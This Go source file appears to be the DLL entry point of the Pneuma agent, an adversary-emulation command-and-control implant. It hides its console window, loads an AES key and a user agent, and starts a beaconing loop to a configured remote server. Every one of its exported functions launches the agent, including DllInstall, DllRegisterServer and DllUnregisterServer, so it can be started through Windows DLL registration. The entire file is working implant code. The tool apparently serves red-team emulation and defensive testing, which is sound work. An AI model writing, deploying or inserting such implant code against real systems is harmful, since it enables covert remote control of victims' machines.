package main

import "C"
import (
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	"os"
	"strings"
)

var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"

func main() {}

func start(agent *util.AgentConfig) {
	util.DebugMode = &agent.Debug
	if !*util.DebugMode {
		util.HideConsole()
	}
	if !strings.Contains(agent.Address, ":") {
		util.DebugLogf("Your address is incorrect\n")
		os.Exit(1)
	}
	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent
	util.DebugLogf("[%s] agent at PID %d using hash randomizing string %s", agent.Address, agent.Pid, randomHash)
	sockets.EventLoop(agent, agent.BuildBeacon())
}

//export VoidFunc
func VoidFunc() {
	agent := util.BuildAgentConfig()
	start(agent)
}

//export RunAgent
func RunAgent()  {
	agent := util.BuildAgentConfig()
	start(agent)
}

//export DllInstall
func DllInstall() {
	agent := util.BuildAgentConfig()
	start(agent)
}

//export DllRegisterServer
func DllRegisterServer() {
	agent := util.BuildAgentConfig()
	start(agent)
}

//export DllUnregisterServer
func DllUnregisterServer() {
	agent := util.BuildAgentConfig()
	start(agent)
}